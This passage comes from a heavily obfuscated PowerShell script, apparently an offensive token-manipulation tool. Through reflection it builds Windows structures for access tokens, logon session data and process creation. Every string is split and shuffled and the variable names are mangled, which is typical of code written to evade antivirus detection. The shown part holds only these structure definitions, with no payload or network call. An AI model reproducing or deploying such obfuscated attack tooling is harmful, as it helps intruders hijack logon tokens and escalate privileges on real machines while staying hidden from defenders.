    ${TY`pE`BuiLDER}.("{0}{2}{1}" -f'DefineL','eral','it').Invoke(("{3}{2}{4}{5}{0}{1}"-f 'n','Type','e','Tok','nEleva','tio'), [UInt32] 18) | &("{0}{1}{2}" -f 'Out','-Nul','l')
    ${Typebu`i`LdeR}.("{1}{2}{0}" -f 'eLiteral','Def','in').Invoke(("{1}{3}{0}{2}"-f'nk','Token','edToken','Li'), [UInt32] 19) | &("{0}{1}" -f 'Out-Nu','ll')
    ${TyP`EBu`I`lDER}.("{0}{3}{1}{2}" -f'Define','iter','al','L').Invoke(("{1}{3}{0}{2}"-f 'leva','Toke','tion','nE'), [UInt32] 20) | &("{0}{2}{1}"-f'Ou','Null','t-')
    ${T`yP`EBUI`LDER}.("{4}{0}{3}{1}{2}" -f'ineLi','er','al','t','Def').Invoke(("{2}{1}{3}{4}{0}" -f 'ns','Restri','TokenHas','c','tio'), [UInt32] 21) | &("{0}{1}{2}" -f 'Out-','Nu','ll')
    ${TyPeBU`i`Ld`Er}.("{0}{2}{3}{1}" -f'De','Literal','fin','e').Invoke(("{4}{1}{3}{6}{5}{2}{0}"-f'n','okenA','atio','cces','T','form','sIn'), [UInt32] 22) | &("{2}{1}{0}" -f'l','Nul','Out-')
    ${TYPEb`U`iLdER}.("{2}{1}{4}{3}{0}"-f 'al','fin','De','er','eLit').Invoke(("{0}{4}{5}{3}{6}{1}{2}" -f 'T','ionAllowe','d','nVirtualiz','o','ke','at'), [UInt32] 23) | &("{1}{0}" -f 't-Null','Ou')
    ${TypeBU`iL`DER}.("{0}{1}{2}" -f 'Def','ineLiter','al').Invoke(("{3}{0}{5}{4}{6}{1}{2}"-f 'en','tion','Enabled','Tok','rtu','Vi','aliza'), [UInt32] 24) | &("{0}{1}"-f'O','ut-Null')
    ${Ty`pE`BUi`lDer}.("{0}{3}{1}{2}" -f 'Defin','ra','l','eLite').Invoke(("{3}{0}{4}{2}{1}" -f'nInte','el','rityLev','Toke','g'), [UInt32] 25) | &("{1}{2}{0}" -f'l','Out','-Nul')
    ${t`ypEb`Ui`Lder}.("{1}{0}{2}"-f 'te','DefineLi','ral').Invoke(("{2}{0}{1}"-f 'okenUIAcce','ss','T'), [UInt32] 26) | &("{0}{2}{1}"-f 'Ou','ll','t-Nu')
    ${Ty`P`EbuI`ldEr}.("{3}{1}{2}{0}"-f'l','eLite','ra','Defin').Invoke(("{1}{4}{2}{3}{0}"-f 'Policy','T','andat','ory','okenM'), [UInt32] 27) | &("{1}{2}{0}"-f 'll','Out-N','u')
    ${typEB`U`ILder}.("{0}{1}{2}"-f 'DefineLi','tera','l').Invoke(("{1}{2}{0}" -f'd','Tok','enLogonSi'), [UInt32] 28) | &("{2}{0}{1}" -f'-Nul','l','Out')
    ${T`ypEb`UI`LDer}.("{2}{0}{1}{3}"-f 'ineLite','ra','Def','l').Invoke(("{3}{2}{4}{1}{0}"-f 'r','pContaine','k','To','enIsAp'), [UInt32] 29) | &("{0}{1}"-f 'O','ut-Null')
    ${Typ`EbUi`lder}.("{4}{3}{1}{0}{2}"-f 't','ineLi','eral','ef','D').Invoke(("{3}{4}{2}{0}{1}" -f 'ie','s','Capabilit','To','ken'), [UInt32] 30) | &("{0}{1}{2}" -f'Out-','N','ull')
    ${TYP`Eb`UildeR}.("{4}{1}{2}{3}{0}"-f 'l','f','ineLit','era','De').Invoke(("{6}{2}{0}{1}{3}{5}{4}"-f'p','pCo','okenA','ntain','id','erS','T'), [UInt32] 31) | &("{1}{0}"-f'Null','Out-')
    ${TYPE`BuIl`deR}.("{3}{0}{1}{2}" -f 'f','ine','Literal','De').Invoke(("{1}{4}{5}{6}{3}{2}{0}"-f'Number','Tok','r','ne','en','AppCon','tai'), [UInt32] 32) | &("{2}{1}{0}" -f '-Null','t','Ou')
    ${tYPEB`U`IL`DEr}.("{0}{1}{2}"-f'D','ef','ineLiteral').Invoke(("{5}{3}{4}{2}{0}{6}{1}"-f 'u','s','b','serCl','aimAttri','TokenU','te'), [UInt32] 33) | &("{0}{1}{2}"-f 'O','u','t-Null')
    ${tYPe`BUi`ld`eR}.("{2}{0}{4}{1}{3}" -f'ineL','era','Def','l','it').Invoke(("{6}{2}{4}{0}{1}{3}{5}"-f'ai','mAt','enDevice','t','Cl','ributes','Tok'), [UInt32] 34) | &("{2}{1}{0}" -f 'l','l','Out-Nu')
    ${t`YPeB`UIld`Er}.("{1}{2}{0}{3}"-f 'Lit','Defin','e','eral').Invoke(("{9}{8}{7}{5}{1}{4}{3}{2}{10}{0}{6}"-f'ut','trictedU','ai','erCl','s','Res','es','n','oke','T','mAttrib'), [UInt32] 35) | &("{1}{0}{2}"-f'u','O','t-Null')
    ${t`yPEbuILd`Er}.("{0}{2}{4}{3}{1}" -f 'D','Literal','ef','e','in').Invoke(("{4}{3}{7}{5}{8}{6}{9}{1}{2}{0}" -f's','tribut','e','estrict','TokenR','De','Cl','ed','vice','aimAt'), [UInt32] 36) | &("{2}{0}{1}" -f 'ut-Nu','ll','O')
    ${tyPe`Bu`iLDER}.("{4}{0}{3}{2}{1}" -f'it','l','ra','e','DefineL').Invoke(("{3}{4}{1}{0}{2}" -f'viceGr','De','oups','T','oken'), [UInt32] 37) | &("{1}{2}{0}" -f'l','Out-Nu','l')
    ${TYPeBU`iL`d`ER}.("{0}{1}{2}"-f'Def','ineLitera','l').Invoke(("{1}{4}{5}{0}{2}{3}" -f'eviceGr','To','ou','ps','kenRestr','ictedD'), [UInt32] 38) | &("{0}{1}"-f 'Out-Nu','ll')
    ${t`yPEbU`ILDeR}.("{2}{3}{1}{0}"-f 'ral','ite','Defin','eL').Invoke(("{4}{6}{1}{3}{2}{5}{0}" -f'es','it','At','y','Toke','tribut','nSecur'), [UInt32] 39) | &("{2}{1}{0}" -f 't-Null','u','O')
    ${tYp`EBUil`dER}.("{2}{0}{1}"-f'itera','l','DefineL').Invoke(("{4}{2}{0}{3}{1}"-f'enIs','estricted','k','R','To'), [UInt32] 40) | &("{2}{0}{1}" -f'ut-Nul','l','O')
    ${T`yP`EBUi`ldEr}.("{2}{1}{3}{0}"-f 'l','fi','De','neLitera').Invoke(("{0}{3}{2}{1}"-f'MaxT','oClass','Inf','oken'), [UInt32] 41) | &("{0}{1}" -f'Out','-Null')
	${TOk`eN_iNFor`MatIOn`_cLA`Ss} = ${t`y`PEBUi`lder}.("{0}{2}{1}"-f'Cre','pe','ateTy').Invoke()

    
    ${aTT`RiBUT`Es} = ("{13}{0}{14}{4}{3}{9}{5}{17}{1}{11}{16}{15}{2}{12}{8}{6}{10}{7}" -f 'u',', Pu','ntia','ayout,','oL','ss,','ut, Sealed, BeforeF','ldInit','o',' AnsiCla','ie','bli','lLay','A','t','ue','c, Seq',' Class')
	${TY`PebuILd`ER} = ${MoD`U`l`E`BUildEr}.("{2}{0}{1}" -f'efineTyp','e','D').Invoke(("{3}{1}{2}{0}"-f'ER','ARGE','_INTEG','L'), ${ATtrI`BU`TEs}, [System.ValueType], 8)
	${T`ypebU`IldeR}.("{0}{2}{1}" -f'DefineFi','d','el').Invoke(("{1}{0}"-f 'rt','LowPa'), [UInt32], ("{1}{0}"-f'lic','Pub')) | &("{0}{1}{2}" -f'Out-Nu','l','l')
	${TYPEB`U`ildEr}.("{1}{2}{0}{3}"-f 'Fie','Defin','e','ld').Invoke(("{1}{2}{0}" -f'rt','Hi','ghPa'), [UInt32], ("{0}{1}"-f'Publi','c')) | &("{0}{1}"-f'Out-Nul','l')
	${LaRG`e`_iNtE`ger} = ${TyPebuil`D`eR}.("{2}{0}{1}" -f'eTyp','e','Creat').Invoke()

    
    ${a`TTR`ib`UTeS} = ("{1}{12}{0}{11}{2}{8}{15}{17}{7}{5}{9}{6}{16}{13}{10}{14}{4}{3}"-f'AnsiClas','AutoLayo','Public, Sequ','t','i','aled, B','fo',', Se','e','e','Field','s, Class, ','ut, ','e','In','ntialLayo','r','ut')
	${TYpeB`Uil`der} = ${moDUl`eBU`IlDEr}.("{1}{2}{0}" -f'eType','Defi','n').Invoke(("{1}{0}" -f 'ID','LU'), ${at`TRib`UTes}, [System.ValueType], 8)
	${TYpe`B`UilDER}.("{2}{3}{1}{0}" -f'eld','i','D','efineF').Invoke(("{0}{2}{1}"-f'LowP','rt','a'), [UInt32], ("{0}{1}" -f 'Pu','blic')) | &("{0}{1}{2}"-f 'Ou','t-','Null')
	${tyP`Eb`UILDER}.("{1}{2}{3}{0}" -f'Field','D','efi','ne').Invoke(("{2}{1}{0}"-f 't','r','HighPa'), [Int32], ("{1}{0}"-f 'c','Publi')) | &("{1}{0}"-f'Null','Out-')
	${lu`id} = ${tY`PEBU`ilDEr}.("{2}{0}{1}" -f'eat','eType','Cr').Invoke()

    
    ${Attrib`UT`es} = ("{10}{11}{12}{4}{9}{3}{6}{2}{13}{7}{14}{0}{16}{5}{1}{17}{8}{15}" -f'Layout, S','d, ','Publ','ass','lass, ','ale',', ','en','iel','Cl','Au','toLayout, An','siC','ic, Sequ','tial','dInit','e','BeforeF')
	${TYPe`BuI`LDER} = ${M`OD`ULEBUI`LDeR}.("{0}{2}{1}"-f 'D','Type','efine').Invoke(("{3}{1}{2}{4}{0}"-f 'CS','O','KEN_STATIST','T','I'), ${ATTr`IbU`Tes}, [System.ValueType])
	${t`Yp`e`BUILDEr}.("{0}{1}{3}{2}"-f'D','efin','Field','e').Invoke(("{1}{2}{0}"-f 'nId','Tok','e'), ${l`UiD}, ("{1}{0}"-f 'c','Publi')) | &("{2}{0}{1}"-f'ut-Nu','ll','O')
	${TYpE`B`Uilder}.("{0}{1}{2}" -f 'De','f','ineField').Invoke(("{3}{0}{4}{1}{2}"-f'icati','n','Id','Authent','o'), ${l`UID}, ("{0}{1}"-f 'Publ','ic')) | &("{1}{2}{0}" -f'ull','Ou','t-N')
    ${Typ`ebUi`l`DeR}.("{2}{0}{1}"-f'efineF','ield','D').Invoke(("{3}{2}{1}{4}{0}"-f'ime','i','xpirat','E','onT'), ${l`ARge_`I`NTeGeR}, ("{0}{1}" -f'Publ','ic')) | &("{0}{2}{1}" -f 'Out-','ll','Nu')
    ${TY`P`eBUil`der}.("{0}{2}{3}{1}"-f'De','d','fineF','iel').Invoke(("{0}{1}{2}" -f 'TokenT','yp','e'), [UInt32], ("{0}{1}"-f'P','ublic')) | &("{2}{1}{0}"-f 'ull','t-N','Ou')
    ${TY`P`EBu`ildeR}.("{2}{1}{0}" -f'd','l','DefineFie').Invoke(("{3}{4}{2}{0}{1}" -f'ationLev','el','son','Imp','er'), [UInt32], ("{1}{0}" -f'ublic','P')) | &("{0}{1}"-f'Out-Nul','l')
    ${TY`PEb`Ui`lder}.("{0}{1}{3}{2}"-f 'D','e','neField','fi').Invoke(("{0}{1}{2}" -f'DynamicChar','g','ed'), [UInt32], ("{0}{2}{1}" -f 'Pu','c','bli')) | &("{0}{2}{1}" -f 'Out-','ull','N')
    ${Typ`ebuilD`Er}.("{2}{3}{1}{0}" -f'ld','Fie','D','efine').Invoke(("{1}{0}{2}{3}{4}"-f'ail','DynamicAv','a','bl','e'), [UInt32], ("{0}{1}"-f'Pub','lic')) | &("{2}{1}{0}" -f't-Null','u','O')
    ${T`Y`pEBu`IldeR}.("{2}{0}{1}" -f 'in','eField','Def').Invoke(("{0}{1}{2}" -f'Group','Cou','nt'), [UInt32], ("{1}{0}"-f'ublic','P')) | &("{0}{2}{1}" -f'Out-N','l','ul')
    ${TyPe`BuIl`dER}.("{1}{2}{3}{0}" -f'd','Define','Fi','el').Invoke(("{1}{0}{2}{3}" -f 'egeC','Privil','o','unt'), [UInt32], ("{0}{1}" -f'P','ublic')) | &("{0}{2}{1}"-f 'O','t-Null','u')
    ${typE`Bu`ILD`er}.("{1}{3}{0}{2}" -f 'in','De','eField','f').Invoke(("{2}{0}{1}"-f'odified','Id','M'), ${L`UiD}, ("{1}{0}"-f'blic','Pu')) | &("{0}{1}" -f'Ou','t-Null')
	${tOken`_sT`A`T`isT`ICs} = ${T`Yp`ebU`iLDEr}.("{0}{2}{1}{3}"-f 'C','yp','reateT','e').Invoke()

    
    ${A`TTr`i`BuTeS} = ("{5}{9}{15}{0}{7}{12}{8}{1}{13}{2}{4}{14}{16}{11}{17}{18}{6}{3}{19}{10}" -f ' ',', ','ublic, S','oreFieldI','equentialLayo','Auto',', Bef','AnsiCla','s','Layou','it','l','ss, Clas','P','u','t,','t, Sea','e','d','n')
	${TYpEbu`iLd`eR} = ${Mod`UL`eb`UILD`eR}.("{1}{2}{0}" -f'Type','D','efine').Invoke(("{0}{1}{2}{3}{4}"-f'LSA_UNI','C','O','DE_ST','RING'), ${ATTRi`B`U`TEs}, [System.ValueType])
	${t`YpeBUiL`der}.("{1}{2}{3}{0}"-f 'eld','D','efin','eFi').Invoke(("{0}{1}" -f 'Le','ngth'), [UInt16], ("{0}{1}{2}"-f'Publ','i','c')) | &("{2}{1}{0}" -f 'll','ut-Nu','O')
	${TY`p`EB`UIldeR}.("{0}{1}{2}{3}" -f 'De','f','ine','Field').Invoke(("{3}{2}{0}{1}"-f 'ngt','h','ximumLe','Ma'), [UInt16], ("{0}{1}"-f'Publ','ic')) | &("{0}{1}{2}"-f'Out-','N','ull')
    ${ty`pEB`Uil`Der}.("{2}{1}{0}" -f 'ld','neFie','Defi').Invoke(("{1}{0}" -f'er','Buff'), [IntPtr], ("{1}{2}{0}" -f 'lic','P','ub')) | &("{2}{0}{1}"-f't-N','ull','Ou')
	${ls`A_UnIC`oD`E`_`St`Ring} = ${TYpE`BU`I`lDER}.("{1}{0}{2}"-f'eat','Cr','eType').Invoke()

    
    ${ATT`RIB`U`TEs} = ("{17}{20}{1}{8}{3}{7}{4}{22}{0}{21}{9}{16}{14}{12}{2}{11}{18}{10}{5}{19}{6}{15}{13}" -f 'Publi','nsi','ut, S','la','la','ef','ld','ss, C','C',', Sequ',', B','e','ialLayo','t','t','Ini','en','A','aled','oreFie','utoLayout, A','c','ss, ')
	${tY`pE`BUI`lDEr} = ${MoD`Ul`Ebu`il`Der}.("{1}{0}{2}" -f'Typ','Define','e').Invoke(("{0}{3}{1}{4}{2}"-f 'LSA_LAST','INTER_LOGON','FO','_','_IN'), ${aTTR`i`BUTes}, [System.ValueType])
	${TYPe`B`Ui`LDeR}.("{2}{1}{0}"-f 'd','el','DefineFi').Invoke(("{2}{4}{3}{0}{1}"-f 'cessfulLo','gon','La','uc','stS'), ${laRGE_i`NTeG`eR}, ("{2}{0}{1}" -f'l','ic','Pub')) | &("{2}{0}{1}"-f'u','t-Null','O')
	${TyPebUil`D`er}.("{2}{0}{1}"-f 'ineFiel','d','Def').Invoke(("{3}{0}{1}{2}{4}"-f 'stFailed','Log','o','La','n'), ${L`ARgE`_I`NTEg`eR}, ("{0}{1}"-f'Pub','lic')) | &("{0}{1}"-f'Ou','t-Null')
    ${TYPeBu`IlD`eR}.("{3}{1}{0}{2}"-f'ne','i','Field','Def').Invoke(("{0}{1}{7}{3}{6}{2}{8}{5}{4}"-f'Fail','e','LastSuc','n','n','ogo','tSince','dAttemptCou','cessfulL'), [UInt32], ("{2}{1}{0}" -f 'c','i','Publ')) | &("{1}{2}{0}"-f'll','O','ut-Nu')
	${L`sa_LAst`_`INteR_`loGon_`i`NfO} = ${Ty`pe`BU`IlDER}.("{1}{2}{0}" -f'eType','Cre','at').Invoke()

    
    ${aT`TR`ibUt`es} = ("{4}{8}{11}{10}{7}{0}{5}{12}{2}{6}{9}{1}{3}"-f 'i','ea','ential','led, BeforeFieldInit','AutoLayout, A','c, Se','Layout,','bl','nsiClas',' S','u','s, Class, P','qu')
	${TYP`eb`UIld`er} = ${M`odU`LEbui`lD`Er}.("{1}{2}{0}{3}"-f'Typ','Def','ine','e').Invoke(("{4}{0}{2}{1}{3}" -f 'ECU','N_DA','RITY_LOGON_SESSIO','TA','S'), ${AttrI`Bu`T`ES}, [System.ValueType])
	${tYpEB`Ui`lder}.("{2}{3}{0}{1}"-f'fineFi','eld','D','e').Invoke(("{1}{0}"-f'e','Siz'), [UInt32], ("{1}{0}{2}"-f 'l','Pub','ic')) | &("{2}{1}{0}"-f'Null','-','Out')
	${tyPebU`i`l`DEr}.("{2}{0}{1}"-f'in','eField','Def').Invoke(("{1}{0}{2}"-f'o','L','ginID'), ${l`Uid}, ("{1}{0}" -f 'blic','Pu')) | &("{2}{0}{1}"-f't-Nul','l','Ou')
    ${Type`BUi`LD`er}.("{1}{2}{0}"-f 'd','DefineF','iel').Invoke(("{1}{0}"-f 'name','User'), ${LsA_uN`I`coDE_`StriNg}, ("{0}{1}"-f 'P','ublic')) | &("{1}{2}{0}" -f'l','Out','-Nul')
    ${typ`E`BuI`ldeR}.("{0}{2}{3}{1}" -f'De','ld','fineFi','e').Invoke(("{2}{1}{3}{0}" -f 'main','gin','Lo','Do'), ${LSA_`U`Ni`cODE_stRInG}, ("{0}{1}" -f'Publi','c')) | &("{1}{2}{0}"-f 'Null','O','ut-')
    ${typ`E`BUildEr}.("{0}{3}{1}{2}"-f'D','fine','Field','e').Invoke(("{5}{3}{0}{1}{2}{4}"-f 'cationPac','k','ag','enti','e','Auth'), ${L`Sa_u`N`icoDE_`ST`RiNG}, ("{0}{1}" -f'P','ublic')) | &("{1}{0}{2}"-f'-N','Out','ull')
    ${tY`PEbUIL`d`er}.("{0}{3}{2}{1}"-f 'De','eld','neFi','fi').Invoke(("{2}{0}{1}"-f'yp','e','LogonT'), [UInt32], ("{0}{1}"-f 'Publ','ic')) | &("{0}{1}" -f 'O','ut-Null')
    ${TYPE`BUiL`Der}.("{3}{1}{2}{0}" -f 'd','fine','Fiel','De').Invoke(("{1}{0}" -f'sion','Ses'), [UInt32], ("{0}{1}{2}"-f 'P','u','blic')) | &("{1}{0}" -f'Null','Out-')
    ${T`yPE`BUIl`DEr}."def`IN`e`FIELd"('Sid', [IntPtr], ("{0}{1}{2}" -f'P','u','blic')) | &("{1}{0}{2}"-f't-Nul','Ou','l')
    ${tyPEB`UI`LdEr}.("{3}{1}{2}{0}"-f'eld','efineF','i','D').Invoke(("{0}{1}{2}"-f'Lo','g','inTime'), ${l`Arge`_`inteGEr}, ("{1}{0}"-f 'ublic','P')) | &("{0}{1}{2}" -f'Out-','Nul','l')
    ${tYpeb`Ui`ld`er}.("{2}{1}{3}{0}" -f'eld','ine','Def','Fi').Invoke(("{2}{0}{1}"-f'ginSe','rver','Lo'), ${l`S`A_U`NICOdE_sTri`Ng}, ("{1}{0}" -f'lic','Pub')) | &("{1}{0}{2}"-f 'N','Out-','ull')
    ${TY`P`Ebui`LDEr}.("{3}{2}{1}{0}"-f'ld','Fie','ne','Defi').Invoke(("{0}{2}{1}{3}"-f 'Dns','ainN','Dom','ame'), ${LsA_UNi`coD`e`_`STring}, ("{0}{1}" -f'Publ','ic')) | &("{0}{1}{2}"-f'O','ut-','Null')
    ${ty`peB`UilD`er}.("{1}{3}{2}{0}"-f'eld','De','eFi','fin').Invoke('Upn', ${lS`A`_UnICOD`e_stR`InG}, ("{0}{2}{1}" -f'Pu','lic','b')) | &("{2}{1}{0}"-f '-Null','t','Ou')
    ${tyPeb`Uil`deR}.("{1}{3}{2}{0}" -f'eField','Def','n','i').Invoke(("{0}{1}"-f'UserFlag','s'), [UInt32], ("{2}{1}{0}"-f 'ic','l','Pub')) | &("{1}{2}{0}" -f 'l','Out','-Nul')
    ${T`y`pEbUIld`Er}.("{2}{0}{1}"-f 'F','ield','Define').Invoke(("{1}{2}{3}{0}" -f 'nInfo','LastLo','g','o'), ${LSa_L`ASt_InT`eR`_lOgOn_i`NfO}, ("{0}{1}"-f'Publ','ic')) | &("{2}{0}{1}" -f'-Nu','ll','Out')
    ${Typeb`Ui`ldeR}.("{1}{2}{0}"-f'ineField','D','ef').Invoke(("{1}{3}{2}{0}"-f't','Log','Scrip','on'), ${lS`A_u`NICoDe_`sTRIng}, ("{1}{0}"-f'lic','Pub')) | &("{2}{1}{0}"-f'Null','t-','Ou')
    ${T`yPebU`I`lDEr}.("{1}{0}{2}" -f 'efineF','D','ield').Invoke(("{2}{1}{0}{3}"-f'le','ofi','Pr','Path'), ${L`S`A`_`UnIc`oDE_strING}, ("{1}{0}"-f'ublic','P')) | &("{2}{1}{0}"-f'Null','t-','Ou')
    ${TypebuI`L`d`ER}.("{0}{2}{1}" -f'D','ield','efineF').Invoke(("{0}{1}{2}"-f'HomeDirect','or','y'), ${ls`A`_Unico`De_ST`Ri`Ng}, ("{0}{1}"-f'Publi','c')) | &("{0}{1}{2}" -f'Out-','Nul','l')
    ${T`Ypeb`UIl`dEr}.("{1}{2}{0}" -f 'd','Defi','neFiel').Invoke(("{5}{3}{1}{0}{2}{4}"-f'oryDr','rect','i','i','ve','HomeD'), ${l`SA_U`NIcOde_Stri`NG}, ("{1}{0}"-f 'c','Publi')) | &("{1}{0}"-f'll','Out-Nu')
    ${T`YPEBui`LD`er}.("{0}{2}{1}"-f 'Defin','ld','eFie').Invoke(("{1}{2}{0}"-f 'ffTime','Log','o'), ${LaR`g`E_in`TeGER}, ("{0}{1}"-f'Pu','blic')) | &("{1}{0}{2}"-f't-N','Ou','ull')
    ${T`ypE`BUiLdeR}.("{0}{1}{3}{2}"-f'Def','ine','ld','Fie').Invoke(("{0}{1}{2}"-f'KickOffT','im','e'), ${laRGe`_in`T`EgEr}, ("{1}{0}" -f 'ic','Publ')) | &("{2}{1}{0}"-f 'ull','t-N','Ou')
    ${TY`pEb`UiLd`ER}.("{2}{1}{0}"-f 'Field','efine','D').Invoke(("{1}{2}{3}{0}" -f 'Set','P','assw','ordLast'), ${LAr`g`E`_`IntEger}, ("{1}{0}" -f 'ublic','P')) | &("{0}{2}{1}"-f 'Out-Nu','l','l')
    ${t`Yp`ebu`iLdEr}.("{1}{0}{2}" -f'neFie','Defi','ld').Invoke(("{1}{2}{3}{0}"-f 'ange','Passw','or','dCanCh'), ${La`RGe`_`iNT`egeR}, ("{0}{1}" -f 'Pub','lic')) | &("{0}{1}"-f'Out-Nu','ll')
    ${TY`pe`Bui`LDER}.("{2}{0}{3}{1}"-f 'efineF','eld','D','i').Invoke(("{1}{0}{2}{3}"-f 'ustCh','PasswordM','a','nge'), ${lARGe_I`NTe`GeR}, ("{2}{0}{1}"-f 'b','lic','Pu')) | &("{2}{1}{0}"-f 'l','t-Nul','Ou')
	${SecU`R`i`TY`_LOG`on`_SessiOn_D`A`TA} = ${T`yPEBU`I`lDer}.("{0}{2}{1}"-f'C','teType','rea').Invoke()

    
    ${At`T`RIbUTEs} = ("{16}{17}{5}{12}{3}{6}{13}{4}{2}{7}{15}{18}{8}{9}{11}{14}{0}{10}{1}"-f'I','it','alL','l','uenti','lass, Pu','ic','ayout,','ed, Be','fo','n','reF','b',', Seq','ield',' Sea','AutoLayout',', AnsiClass, C','l')
	${T`Ype`BU`iLDEr} = ${MOd`U`LEbUi`lD`eR}.("{2}{0}{1}"-f 'efineTyp','e','D').Invoke(("{0}{3}{2}{1}" -f 'START','INFO','P','U'), ${a`TTRiBUT`ES}, [System.ValueType])
	${TYpeBU`il`d`Er}."de`FINeF`ieLd"('cb', [UInt32], ("{0}{2}{1}" -f'Pu','ic','bl')) | &("{0}{1}{2}"-f 'Out-','Nul','l')
	${t`YpeBUi`L`Der}.("{0}{1}{2}" -f'Defin','eFiel','d').Invoke(("{2}{0}{1}{3}"-f 'R','e','lp','served'), [IntPtr], ("{1}{0}{2}" -f'bli','Pu','c')) | &("{0}{1}"-f'Out-Nul','l')
    ${t`YpeBuiLd`eR}.("{1}{0}{2}" -f'Fiel','Define','d').Invoke(("{2}{1}{0}{3}" -f 'k','es','lpD','top'), [IntPtr], ("{0}{1}"-f 'Pub','lic')) | &("{0}{2}{1}" -f 'Out','Null','-')
    ${T`y`peB`Uilder}.("{0}{1}{2}" -f 'DefineF','ie','ld').Invoke(("{1}{2}{0}" -f 'e','lpTit','l'), [IntPtr], ("{0}{1}" -f 'Pub','lic')) | &("{2}{1}{0}"-f'ull','t-N','Ou')
    ${TYp`Ebui`LdEr}."dE`FInEFie`Ld"('dwX', [UInt32], ("{1}{0}"-f'ic','Publ')) | &("{2}{0}{1}" -f't-Nul','l','Ou')
    ${typeb`Ui`LdEr}."DEFi`N`EfIElD"('dwY', [UInt32], ("{2}{1}{0}" -f'c','li','Pub')) | &("{0}{1}" -f'Ou','t-Null')
    ${tyPebUI`l`D`ER}.("{3}{0}{2}{1}" -f 'in','eld','eFi','Def').Invoke(("{1}{0}" -f 'e','dwXSiz'), [UInt32], ("{0}{1}{2}"-f'P','ubl','ic')) | &("{0}{1}" -f'Out-N','ull')
    ${T`ypEB`UILD`eR}.("{2}{1}{3}{0}"-f 'Field','efi','D','ne').Invoke(("{0}{2}{1}"-f'dwYS','ze','i'), [UInt32], ("{1}{0}" -f 'ublic','P')) | &("{0}{1}" -f 'Ou','t-Null')
    ${TyPeBui`ld`er}.("{3}{1}{2}{0}" -f 'ld','n','eFie','Defi').Invoke(("{2}{0}{4}{1}{3}" -f'w','u','d','ntChars','XCo'), [UInt32], ("{2}{1}{0}" -f 'c','ubli','P')) | &("{0}{1}{2}" -f'Ou','t-Nu','ll')
    ${tY`p`eBu`ILDer}.("{3}{1}{2}{0}"-f'd','ineF','iel','Def').Invoke(("{0}{3}{1}{4}{2}"-f 'dwY','o','tChars','C','un'), [UInt32], ("{2}{1}{0}"-f'c','li','Pub')) | &("{1}{0}" -f'ut-Null','O')
    ${ty`pebu`IL`dER}.("{2}{3}{0}{1}"-f'Fiel','d','Def','ine').Invoke(("{2}{1}{0}{3}" -f 'lAttribu','l','dwFi','te'), [UInt32], ("{1}{0}"-f 'ublic','P')) | &("{2}{0}{1}"-f'ut-N','ull','O')
    ${t`ypeb`Ui`lDER}.("{1}{3}{0}{2}" -f 'eFi','Defi','eld','n').Invoke(("{0}{1}"-f 'dw','Flags'), [UInt32], ("{1}{0}{2}" -f'li','Pub','c')) | &("{1}{0}{2}"-f'ut-N','O','ull')
    ${TY`PEB`UildeR}.("{0}{1}{2}"-f 'D','efineFi','eld').Invoke(("{1}{0}{2}"-f'Wi','wShow','ndow'), [UInt16], ("{1}{0}{2}" -f 'u','P','blic')) | &("{1}{2}{0}" -f 'l','Out-','Nul')
    ${tyPebUI`l`Der}.("{2}{0}{1}"-f 'in','eField','Def').Invoke(("{1}{2}{0}" -f'erved2','cbRe','s'), [UInt16], ("{0}{2}{1}"-f 'P','blic','u')) | &("{0}{1}{2}" -f'Out-N','ul','l')
    ${tYPebuI`l`der}.("{2}{1}{0}"-f 'd','Fiel','Define').Invoke(("{0}{2}{3}{1}" -f'lpRes','2','erv','ed'), [IntPtr], ("{1}{0}"-f 'ublic','P')) | &("{1}{0}{2}" -f't','Ou','-Null')
    ${tYPE`BUiL`DeR}.("{3}{2}{1}{0}" -f'ld','Fie','ne','Defi').Invoke(("{0}{2}{1}" -f 'h','tdInput','S'), [IntPtr], ("{2}{0}{1}" -f'ubli','c','P')) | &("{1}{2}{0}" -f'Null','Ou','t-')
    ${ty`p`ebU`ilDeR}.("{3}{2}{0}{1}"-f'neFie','ld','fi','De').Invoke(("{2}{3}{1}{0}" -f't','utpu','h','StdO'), [IntPtr], ("{1}{2}{0}" -f 'ic','Pu','bl')) | &("{1}{2}{0}" -f 'll','Out-','Nu')
    ${t`yPE`BuIl`Der}.("{1}{0}{2}" -f'eFiel','Defin','d').Invoke(("{1}{2}{0}" -f'Error','hSt','d'), [IntPtr], ("{1}{0}"-f'c','Publi')) | &("{1}{0}"-f'ut-Null','O')
	${s`Ta`RTupi`NFO} = ${TYp`eB`UiL`DEr}.("{0}{2}{1}" -f'C','Type','reate').Invoke()

    
    ${A`TTR`ibUT`es} = ("{9}{5}{6}{8}{0}{12}{2}{11}{7}{10}{1}{13}{3}{4}" -f 'Class, Pu',', Sealed, ',' Seque','efo','reFieldInit','C','l','tialL','ass, ','AutoLayout, Ansi','ayout','n','blic,','B')
	${tY`pEbu`iLdER} = ${MoD`UL`ebuIl`dEr}.("{1}{2}{0}" -f 'e','Defin','eTyp').Invoke(("{1}{4}{2}{3}{5}{0}" -f 'TION','PRO','_','IN','CESS','FORMA'), ${AT`T`RIBu`Tes}, [System.ValueType])
	${tY`PEb`UiLdeR}.("{1}{0}{2}" -f 'n','Defi','eField').Invoke(("{0}{2}{1}" -f'hP','ess','roc'), [IntPtr], ("{0}{1}{2}"-f 'Publ','i','c')) | &("{1}{2}{0}"-f 'll','Out','-Nu')
	${TYPe`BuiL`d`ER}.("{2}{1}{0}" -f 'ield','neF','Defi').Invoke(("{1}{0}"-f 'read','hTh'), [IntPtr], ("{0}{1}{2}" -f 'Publ','i','c')) | &("{1}{0}{2}" -f '-','Out','Null')
    ${t`Y`PEBu`iLDer}.("{0}{1}{2}" -f 'DefineFi','el','d').Invoke(("{1}{3}{2}{0}" -f 'd','dw','I','Process'), [UInt32], ("{2}{1}{0}"-f 'c','li','Pub')) | &("{2}{1}{0}" -f'll','-Nu','Out')
    ${t`yPe`BUIld`ER}.("{1}{2}{0}"-f'eld','Define','Fi').Invoke(("{2}{0}{1}"-f'Thre','adId','dw'), [UInt32], ("{0}{1}"-f 'Pub','lic')) | &("{0}{2}{1}"-f 'Out-','ull','N')
	${prOcESS`_i`N`FO`Rm`AtiOn} = ${Ty`p`EbuiLdeR}.("{0}{2}{1}" -f'Cr','e','eateTyp').Invoke()

    
    ${att`RiB`UTeS} = ("{12}{14}{15}{8}{17}{7}{3}{6}{4}{16}{1}{11}{5}{10}{2}{9}{0}{13}" -f'r','bl','yout, Sealed, Bef','la','s','tial','s','C',', AnsiCla','o','La','ic, Sequen','AutoL','eFieldInit','ayou','t',', Pu','ss, ')
